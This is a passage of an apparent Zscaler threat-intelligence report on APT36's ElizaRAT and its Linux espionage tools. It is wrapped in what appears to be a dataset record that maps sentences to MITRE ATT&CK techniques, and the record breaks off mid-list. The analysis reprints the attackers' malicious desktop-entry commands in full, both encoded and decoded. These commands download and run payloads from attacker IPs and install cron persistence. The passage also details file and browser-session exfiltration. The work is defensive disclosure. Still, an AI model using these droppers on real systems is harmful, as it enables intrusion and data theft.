kick starting the malicious activities on the endpoint.\nFigure 1: The MainAsync() method used to start the malicious activities on the endpoint.\nSome of the key operations performed by ElizaRAT are:\n- Initializes the Telegram bot with Communicate.ConnectMe() using the built-in Telegram bot token and sets it up in polling mode to receive commands from the threat actor.\n- Creates a directory: %appdata%\\TextSource - Generates a UUID and username specific to the infected machine.\n- Drops and displays a decoy PDF file to the user.\n- Sets up persistence on the machine.\n- Fetches details on antivirus softwares running on the machine and sends the information to the attacker-controlled Telegram bot.\nIn the following sections, we dive deeper into some of these operations.\nLogging Operation Each execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).\nThe code below shows that logging is done at the local and remote level.\n| // remote logging in Telegram bo await Communication.send_message(\"Username Created with name : \" + TextSource.Settings._username); // local logging on the infected endpoint File.AppendAllText(TextSource.Settings.log_p, \"username created local\\n\"); | Unique Identifier Generation A UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim. It uses Windows Management Instrumentation (WMI) to fetch the processorID and UUID of the machine, and uses both these details to generate a UUID and username specific to the infected machine The only difference between the generated UUID and the username is the \".cookie\" extension. The username is the UUID without the \".cookie\" extension.\nThe image below shows the relevant code used to generate these values.\nFigure 2: The getusername() method used to generate the UUID and username to identify the infected machine.\nC2 Command Format Since the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.\nThe C2 command format looks like this:\nC2 Commands All C2 commands are handled in a switch-case statement by the Bot_OnMessage() method inside the Communicate class. Before the execution of any command, the RAT extracts the username from the C2 command and compares it with the infected machine's username. The command is executed successfully only if both the values match.\nThe following C2 commands are supported by the bot:\n| C2 COMMAND | FUNCTIONALITY | |---|---| | /dir | Fetches the list of files in the specified directory. | | /upload | Uploads the specified file from the victim’s machine. | | /getprocess | Gets the list of processes running on the victim’s machine. The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor. This can be used to fetch the machine’s IP address by supplying a parameter like hxxps://api.ipify[.]org . | | /ping | Checks internet connectivity from the victim’s machine to the specified website. | | /scr | Takes a screenshot of the victim’s machine and sends it to the threat actor in a file named scr.dll . | | /createdir | Creates a directory on the user’s machine. | Persistence In order to achieve persistence on the infected machine, the bot creates a Windows shortcut file (LNK) in the Windows Startup directory.\nThe image below shows the code used to create this shortcut file. The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config. In this case, the shortcut file is called TextSource.lnk.\nFigure 3: The buildforts() method used to create a Windows shortcut file in the Startup directory for persistence.\nThe description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous. In addition, the target command line is set to execute the Control panel applet using rundll32 .\nDisplaying Decoy Content The method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user. This decoy file is present inside the resources section of the .NET binary.\nThe image below shows the decoy file. It is only used to distract the victim and make it appear that an error occurred when opening the file.\nFigure 4: Decoy PDF file displayed to the user.\nMalicious Linux Desktop Entry Files as New Attack Vectors The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before. This attack vector is fairly new and appears to be utilized in very low-volume attacks. So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.\nWe first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.\nNational Informatics Center (NIC), India Phishing Attack - May 2023 In May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India. We notified NIC in May 2023 about this website and the associated threat intel.\nWe also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.\nFrom here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.\nHere are some technical details about this case:\n- ZIP archive MD5 hash: 9c66f8c0c970822985600bed04e56434 - ZIP filename: Delegation_Saudi_Arabia.zip - Desktop entry file MD5 hash: f27a4968af4ed64baef8e086516e86ac - Desktop entry filename: Delegation_Saudi_Arabia.desktop Desktop entry file analysis We found the following content in the desktop entry file:\n| [Desktop Entry] Encoding=UTF-8 Name=Delegation_Saudi_Arabia.pdf Exec=sh -c \"echo 'L3Vzci9iaW4vd2dldCAnaHR0cDovLzEwMy4yLjIzMi44Mjo4MDgxL1R yaS1TZXJ2aWNlLUV4ZXJjaXNlL0RlbGVnYXRpb25fU2F1ZGlfQXJhYmlhLnBkZicgLU8g L3RtcC9EZWxlZ2F0aW9uX1NhdWRpX0FyYWJpYS5wZGY7IC91c3IvYmluL3dnZXQgJ2 h0dHA6Ly8xMDMuMi4yMzIuODI6ODA4MS9JU0VQQy0xMi0yMDIzLUFnZW5kYS1mb3It bWVldGluZy8xODUnIC1PIC90bXAvMTg1LmVsZjsgY2QgL3RtcDsgY2htb2QgK3ggMTg1 LmVsZjtsaWJyZW9mZmljZSAvdG1wL0RlbGVnYXRpb25fU2F1ZGlfQXJhYmlhLn BkZiB8IC4vMTg1LmVsZg==' | base64 -d | sh\" Terminal=false Type=Application Icon=x-office-document | The icon of this desktop entry file is set to \"x-office-document\" to seem like an innocent Office document.\nThe base64-encoded command present inside the desktop entry file decodes to:\n| /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions:\n1. Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .\n2. Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .\n3. Marks the Linux binary as executable.\n4. Uses LibreOffice to open and display the decoy PDF file.\n5. Executes the Linux payload.\nIn this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines. Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.\nTo read about “Lee” agent’s cross-platform capabilities, visit the Lumen blog.\nThe content inside the decoy PDF file is displayed in the image below.\nFigure 5: Decoy PDF displayed to the user.\nThe PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia, where they discussed issues with Indian Armed Forces medical officials.\nInflated File Attack - June 2023 Beginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59. The threat actor proceeded to register multiple domains hosted on this IP. Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.\nIn August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files. These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.\nHere are some technical details about this case:\n- ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5 - ZIP filename: Meeting_agenda.zip - Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9 - Desktop entry filename: approved_copy.desktop Desktop entry file analysis The first anomaly we observed was the large size of the Linux desktop entry file. A size larger than 1 MB for a Linux desktop entry file is rare. Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters. We believe this was an attempt by the threat actor to bypass security scanning solutions.\nThe image below shows the extra characters added to the inflated Linux desktop entry file.\nFigure 6: The inflated Linux desktop entry file.\nThe relevant content from the Linux desktop entry file is shown below.\n| [Desktop Entry] Type=Application Name=approved_copy.pdf Exec=bash -c \"xdg-open 'https://admin-dept[.]in//approved_copy.pdf' && mkdir -p ~/.local/share && wget 64.227.133[.]222/zswap-xbusd -O ~/.local/share/zswap-xbusd && chmod +x ~/.local/share/zswap-xbusd; echo '@reboot ~/.local/share/zswap-xbusd'>>/dev/shm/myc.txt; crontab -u `whoami` /dev/shm/myc.txt; rm /dev/shm/myc.txt; ~/.local/share/zswap-xbusd\" Icon=application-pdf Name[en_US]=approved_copy.desktop | This desktop file performs these main operations:\n- Downloads the decoy PDF file from the https://admin-dept[.]in/approved_copy.pdf URL and displays it to the victim. This decoy file contains an error message to distract the user. Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file.\n- Creates a hidden directory path called, local/share, in the user's home directory.\n- Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget. Saves it as zswap-xbusd in the previously created hidden directory.\n- Writes a short shell script to the file /dev/shm/myc.txt. The shell script reboots the machine and then launches the Linux payload.\n- Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script.\n- Deletes the shell script.\n- Executes the Linux payload.\nFigure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.\nAt the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload. We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file. In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.\nHere is metadata from the new Linux desktop entry file:\n- MD5 hash: 574013c4a22ca2d8d8c76e65ef5e8059 - Filename: approved_copy.desktop The relevant content from the Linux desktop entry file is shown below.\n| [Desktop Entry] Type=Application Name=approved_copy.pdf Exec=bash -c \"xdg-open 'https://admin-br[.]in//approved_copy.pdf' && mkdir -p ~/.local/share && wget 64.227.138[.]127/4200f0916f146d2ac5448e91a3afe1b3/pickle-help -O ~/.local/share/pickle-help && chmod +x ~/.local/share/pickle-help;~/.local/share/pickle-help >/dev/null 2>&1 & sleep 5; wget 134.209.159[.]9/4200f0916f146d2ac5448e91a3afe1b3/ziputils-help -O ~/.local/share/ziputils-help && chmod +x ~/.local/share/ziputils-help; echo '@reboot ~/.local/share/ziputils-help'>>/dev/shm/myc.txt;echo '@reboot ~/.local/share/ziputils-help'>>/dev/shm/myc.txt; crontab -u `whoami` /dev/shm/myc.txt; rm /dev/shm/myc.txt;~/.local/share/ziputils-help &\" Icon=application-pdf Name[en_US]=approved_copy.desktop | The functionality of this file is similar to the previous Linux desktop entry file.\nThe image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”. This is used to distract the user while malicious activities occur in the background.\nFigure 8: The decoy PDF file displayed to the user.\nIn this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at:\n- 64.227.138[.]127 - 134.209.159[.]9 The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.\nHere is the metadata of Linux payloads:\n- MD5 hash: 98279047a7db080129e5ec84533822ef - Filename: pickle-help - MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a - Filename: ziputils-help A quick technical analysis determined these Linux payloads as Mythic Poseidon binaries. Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.\nThe corresponding C2 servers extracted from each malicious Linux payload are listed below.\n| C2 IP ADDRESS | PORT | |---|---| | 108.61.163[.]195 | 7443 | | 64.176.40[.]100 | 7443 | The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.\nFor instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .\nFigure 9: The Mythic C2 panel for the Poseidon binary.\nNew Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage. These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services.\nIn this section, we review two types of cyber espionage tools discovered by our research team.\nGLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata:\n- MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller. We extracted the decompiled Python code to understand its functionality. The image below shows the decompiled code.\nFigure 10: The decompiled code of Python-based cyber espionage tool type 1.\nThese are the key operations performed by this script:\n- The script contains a predefined list of file extensions which are scanned for in the /media directory recursively. The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF.\n- Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/ - The content inside this directory is archived into a ZIP file called usnconfig.zip .\n- Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request. Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.\nWe found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above. However, this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files. In addition to the /media directory, this binary also searches the following paths:\n- /home/{user}/Downloads/**/ - /home/{user}/Documents/**/ - /home/{user}/Desktop/**/ - /home/{user}/Pictures/**/ - /home/{user}/.local/share/Trash/**/ PYSHELLFOX - Custom-built Firefox session stealing Linux utility The second type of cyber espionage tool we discovered steals the Firefox browser session details of the user if the user has a browser tab open with any of the following titles or URLs:\n- email.gov.in/# - inbox - web.whatsapp.com As is evident from this list, the threat actor is interested in exfiltrating the user's Indian government inbox details as well as WhatsApp conversations.\nThe image below shows the relevant code section which does this.\nFigure 11: The decompiled code Python-based cyber espionage tool type 2.\nThe espionage tool under analysis includes this metadata:\n- MD5 hash: c86f9ef23b6bb200fc3c0d9d45f0eb4d - Filename: events-highpri These are the key operations performed by this script:\n- Fetches the list of all the live Firefox sessions by scanning the path .mozilla/firefox/*default*/sessionstore-backups/recovery.js* .\n- For each file on the list, the code locates the file containing the magic bytes, mozLz40\\x00, as the first 8 bytes.\n- Uses LZ4 decompression to extract the JSON data from the magic bytes file. This JSON data has details about the windows and tabs in the current live Firefox session.\n- Iterates over every tab in every Firefox window, extracting the title and the URL from each tab. Then, the code checks if they match any value in the predefined list mentioned earlier.\n- If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive.\n- Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request. In addition to uploading the data, the code also uploads the username, hostname, and current timestamp.\nReasons for New Linux-Based Attack Vectors Why is APT36 suddenly adding new attack vectors for the Linux environment?\n- Historic and widespread usage of Linux in the Indian government sector: Linux-based operating systems are widely used in the Indian government sector. The Debian-based operating system, BOSS (Bharat Online Software Solution), developed by CDAC is used across various state ministries and even the Indian defense forces. For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology.\n- Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors. Consequently, there is now a substantial incentive for APT36 and other nation-state threat actors, known for targeting India, to incorporate new attack vectors and Linux payloads into their arsenal. The ubiquitous use of Linux-based systems in more verticals means more potential victims.\nThreat Attribution We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36. In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.\nDecoy PDF files The decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT. The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.\nBoth these indicators align with our technical analysis of APT36 from November of 2022.\nIn addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.\nLinux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.\nIn March 2023, APT36 used a Python-compiled ELF binary to target the Linux environment in the Indian government sector. You can read about it on the Uptycs blog.\nBy comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.\nThe figure below shows a side-by-side comparison of the two.\nFigure 12: A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36.\nHere is a list of similarities between both cases:\n- A hidden directory path structure is created in the location: ~/.local/share .\n- A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ .\n- The same crontab command is executed.\n- The shell script is deleted.\n- The sequence of commands is similar.\nThreat Actor Infrastructure In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India. We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.\nRegistrant Country of C2 Domains Beginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59. The IP address is related to the Hostinger ASN. This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.\nWhile the WHOIS information for all these domains is redacted, we can still see the registrant country. For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN). However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).\nThe figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.\nFigure 13: A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructure.\nWe believe this was an OPSEC mistake by the threat actor.\nC2 Infrastructure Overlap There is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36.\n- In 2022, the server with IP address 153.92.220[.]48 was used to host the domains below which are registered by APT36:\n- Govscholarships[.]in - Kavach-apps[.]com - Kavach-app[.]in - Rodra[.]in - ksboard[.]in - In the latest instance, a server with IP address: 153.92.220[.]59 was used to host the C2 domains. Both the IP addresses belong to the same subnet: 153.92.220.0/24 - These IP addresses belong to the ASN - AS 47583 (Hostinger) which has been abused by APT36 in the past.\nEmail Associated with Malicious Google Drive Links ElizaRAT is distributed using malicious Google Drive links. Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address. The image below shows the information we retrieved.\nFigure 14: A Google Drive link details revealing owner information.\nThe email address and owner name associated with the Google Drive link was:\n- Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.\nAttacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India. This tactic of using servers in the same region as the targeted country for mounting attacks is another deceptive technique employed by APT36.\nHere is a list of the IP addresses of four servers hosting the malicious Linux payloads:\n- 103.2.232[.]82 - 64.227.133[.]222 - 64.227.138[.]127 - 134.209.159[.]9 Top Level Domain (TLDs) of Malicious Domains In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India. Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.\nConclusion Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment. The infrastructure continues to be active at the time of this blog publication. We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection. We have also done a proactive responsible disclosure to the National Informatics Centre (NIC), India with IOC details and the associated threat intelligence.\nAPT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs). In addition to staying on top of these threats, Zscaler's ThreatLabz team continuously monitors for new threats and shares its findings with the wider community.\nZscaler Coverage Zscaler's multilayered cloud security platform detects indicators at various levels.\n- Win32.RAT.ElizaRAT - Win64.RAT.ElizaRAT - Linux.Payload.GLOBSHELL - Linux.Payload.PYSHELLFOX - Linux.Backdoor.Mythic The image below shows the sandbox detection for the new Windows RAT (ElizaRAT) used in the attack.\n- admincell[.]in - admin-dept[.]in - coordbranch[.]in - adminbr[.]in - coordbr[.]in - admin-desk[.]in - admindesk[.]in - adminsec[.]in - admindept[.]in - admin-br[.]in - hxxps://email9ov[.]in/VISIT_OF_MEDICAL/ - hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/ The domains and URLs below are related to the Python-based cyber espionage tools.\n- baseuploads[.]com - baseuploads[.]com/myf/test.php - indiauc[.]com - indiauc[.]com/myf/test.php The URLs used to host the password-protected archive files distributing ElizaRAT:\n- hxxps://drive.google.com/uc?export=download&id=1SaBv9C5EJlXKCQQ_8Tlkl1cBJ9-9XN8u - hxxps://drive.google.com/uc?export=download&id=140KPyaNuYZgOhP3Q7sTQPZ6a-q6x5j-h Was this post useful?\nDisclaimer: This blog post has been created by Zscaler for informational purposes only and is provided \"as is\" without any guarantees of accuracy, completeness or reliability. Zscaler assumes no responsibility for any errors or omissions or for any actions taken based on the information provided. Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices. All content is subject to change without notice. By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.\nGet the latest Zscaler blog updates in your inbox By submitting the form, you are agreeing to our privacy policy.",
+  "ID_list": [
+    "T1027.001",
+    "T1036",
+    "T1218.002",
+    "T1564.001",
+    "T1567.002"
+  ],
+  "Name_list": [
+    "Execution",
+    "Exfiltration",
+    "Masquerading",
+    "Persistence",
+    "Phishing",
+    "Rundll32",
+    "Source",
+    "System Services"
+  ],
+  "TTP_sentences": {
+    "T1027.001": [
+      {
+        "sentence": "Zscaler Blog Get the latest Zscaler blog updates in your inbox A peek into APT36’s updated arsenal Introduction In July 2023, Zscaler ThreatLabz discovered new malicious activity perpetuated by the Pakistan-based advanced persistent threat group (APT36).",
+        "score": 0.4833
+      },
+      {
+        "sentence": "We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.",
+        "score": 0.4359
+      },
+      {
+        "sentence": "In this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.",
+        "score": 0.51
+      },
+      {
+        "sentence": "Key Takeaways - Updated arsenal of APT36: The threat actor has resurfaced with a fresh, fully functional Windows remote administration tool (RAT), novel tools for cyber espionage on Linux systems, innovative distribution methods, and additional attack vectors. - New Windows RAT: A custom RAT, referred to as ElizaRAT, has been incorporated into the APT36 toolkit.",
+        "score": 0.3526
+      },
+      {
+        "sentence": "They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India. - Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.",
+        "score": 0.3348
+      },
+      {
+        "sentence": "Brief Overview APT36 is an advanced persistent threat (APT) group which we attribute to Pakistan with very high confidence.",
+        "score": 0.354
+      },
+      {
+        "sentence": "This group has been active since 2013 and primarily targets the Indian government, defense, and education sectors.",
+        "score": 0.334
+      },
+      {
+        "sentence": "ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links.",
+        "score": 0.5833
+      },
+      {
+        "sentence": "During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics: - They are all .NET binaries that are compiled as Control Panel applets (CPL) and use the \".cpl\" file extension.",
+        "score": 0.5184
+      },
+      {
+        "sentence": "To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format. - The binaries are large in size - ranging from 4MB to 16MB. - The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes. - The Telegram API was used for C2 communication.",
+        "score": 0.6378
+      },
+      {
+        "sentence": "For this technical analysis, we use the following file metadata: - MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0 - Filename: AgendaMeeting.cpl Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().",
+        "score": 0.4687
+      },
+      {
+        "sentence": "This method transfers control to Program().Main() which in turn invokes an asynchronous task - MainAsync().",
+        "score": 0.3545
+      },
+      {
+        "sentence": "Inside this task, all important malicious operations are carried out.",
+        "score": 0.4078
+      },
+      {
+        "sentence": "The image below shows Program().Main() kick starting the malicious activities on the endpoint.",
+        "score": 0.423
+      },
+      {
+        "sentence": "Figure 1: The MainAsync() method used to start the malicious activities on the endpoint.",
+        "score": 0.3275
+      },
+      {
+        "sentence": "In the following sections, we dive deeper into some of these operations.",
+        "score": 0.435
+      },
+      {
+        "sentence": "Logging Operation Each execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).",
+        "score": 0.3041
+      },
+      {
+        "sentence": "The code below shows that logging is done at the local and remote level. | // remote logging in Telegram bo await Communication.send_message(\"Username Created with name : \" + TextSource.Settings._username); // local logging on the infected endpoint File.AppendAllText(TextSource.Settings.log_p, \"username created local\\n\"); | Unique Identifier Generation A UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim.",
+        "score": 0.3814
+      },
+      {
+        "sentence": "It uses Windows Management Instrumentation (WMI) to fetch the processorID and UUID of the machine, and uses both these details to generate a UUID and username specific to the infected machine The only difference between the generated UUID and the username is the \".cookie\" extension.",
+        "score": 0.3511
+      },
+      {
+        "sentence": "The image below shows the relevant code used to generate these values.",
+        "score": 0.4585
+      },
+      {
+        "sentence": "Figure 2: The getusername() method used to generate the UUID and username to identify the infected machine.",
+        "score": 0.3665
+      },
+      {
+        "sentence": "C2 Command Format Since the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.",
+        "score": 0.3129
+      },
+      {
+        "sentence": "Before the execution of any command, the RAT extracts the username from the C2 command and compares it with the infected machine's username.",
+        "score": 0.3015
+      },
+      {
+        "sentence": "The command is executed successfully only if both the values match.",
+        "score": 0.3372
+      },
+      {
+        "sentence": "The following C2 commands are supported by the bot: | C2 COMMAND | FUNCTIONALITY | |---|---| | /dir | Fetches the list of files in the specified directory. | | /upload | Uploads the specified file from the victim’s machine. | | /getprocess | Gets the list of processes running on the victim’s machine.",
+        "score": 0.3735
+      },
+      {
+        "sentence": "The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor.",
+        "score": 0.5296
+      },
+      {
+        "sentence": "The image below shows the code used to create this shortcut file.",
+        "score": 0.3587
+      },
+      {
+        "sentence": "The description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous.",
+        "score": 0.3666
+      },
+      {
+        "sentence": "In addition, the target command line is set to execute the Control panel applet using rundll32 .",
+        "score": 0.3346
+      },
+      {
+        "sentence": "Displaying Decoy Content The method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user.",
+        "score": 0.5007
+      },
+      {
+        "sentence": "This decoy file is present inside the resources section of the .NET binary.",
+        "score": 0.6148
+      },
+      {
+        "sentence": "The image below shows the decoy file.",
+        "score": 0.4869
+      },
+      {
+        "sentence": "It is only used to distract the victim and make it appear that an error occurred when opening the file.",
+        "score": 0.4209
+      },
+      {
+        "sentence": "Figure 4: Decoy PDF file displayed to the user.",
+        "score": 0.3968
+      },
+      {
+        "sentence": "Malicious Linux Desktop Entry Files as New Attack Vectors The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before.",
+        "score": 0.3806
+      },
+      {
+        "sentence": "This attack vector is fairly new and appears to be utilized in very low-volume attacks.",
+        "score": 0.3097
+      },
+      {
+        "sentence": "So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.",
+        "score": 0.5727
+      },
+      {
+        "sentence": "We first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.",
+        "score": 0.409
+      },
+      {
+        "sentence": "National Informatics Center (NIC), India Phishing Attack - May 2023 In May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India.",
+        "score": 0.3493
+      },
+      {
+        "sentence": "We notified NIC in May 2023 about this website and the associated threat intel.",
+        "score": 0.4004
+      },
+      {
+        "sentence": "We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.",
+        "score": 0.4539
+      },
+      {
+        "sentence": "From here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.",
+        "score": 0.4487
+      },
+      {
+        "sentence": "The base64-encoded command present inside the desktop entry file decodes to: | /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions: 1.",
+        "score": 0.5137
+      },
+      {
+        "sentence": "Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .",
+        "score": 0.4126
+      },
+      {
+        "sentence": "Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .",
+        "score": 0.4114
+      },
+      {
+        "sentence": "Marks the Linux binary as executable.",
+        "score": 0.4707
+      },
+      {
+        "sentence": "Uses LibreOffice to open and display the decoy PDF file.",
+        "score": 0.4194
+      },
+      {
+        "sentence": "Executes the Linux payload.",
+        "score": 0.3181
+      },
+      {
+        "sentence": "In this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines.",
+        "score": 0.4739
+      },
+      {
+        "sentence": "Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.",
+        "score": 0.3362
+      },
+      {
+        "sentence": "To read about “Lee” agent’s cross-platform capabilities, visit the Lumen blog.",
+        "score": 0.4031
+      },
+      {
+        "sentence": "The content inside the decoy PDF file is displayed in the image below.",
+        "score": 0.5448
+      },
+      {
+        "sentence": "Figure 5: Decoy PDF displayed to the user.",
+        "score": 0.3656
